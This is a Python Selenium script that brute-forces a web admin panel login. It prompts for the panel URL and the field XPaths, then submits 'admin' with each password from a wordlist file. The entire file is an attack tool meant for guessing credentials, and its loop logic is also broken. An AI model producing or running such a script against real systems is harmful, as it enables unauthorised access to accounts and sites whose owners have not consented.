from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.alert import Alert #checking website messages
import time
with open('wordlist.txt','r',encoding='utf-8') as f:
    wordlist = f.read().splitlines()
a = 0
def start():
    driver = webdriver.Chrome()
    alert = Alert(driver)
    #driver.get("https://www.abc.com/admin/")
    driver.get(panel_url)
    time.sleep(2)
    while (a==0):
        for password in wordlist:
            #u_name = driver.find_element("xpath", '//*[@id="form-layout"]/div[1]/div[2]/input')
            u_name = driver.find_element("xpath", panel_name )
            u_name.send_keys("admin")
            #pass = driver.find_element("xpath" , '//*[@id="form-layout"]/div[2]/div[2]/input')
            u_pass = driver.find_element("xpath" , panel_pass)
            u_pass.send_keys(password)
            u_pass.send_keys(Keys.ENTER)
            time.sleep(0.5)
            if alert.text: #if website alert pops up
                alert.accept() #accept the pops up
    driver.quit()
print("Enter Admin Panel URL= ")
panel_url = input()
print("Enter Xpath of Username= ")
panel_name = input()
print("Enter Xpath of Password= ")
panel_pass = input()
start()
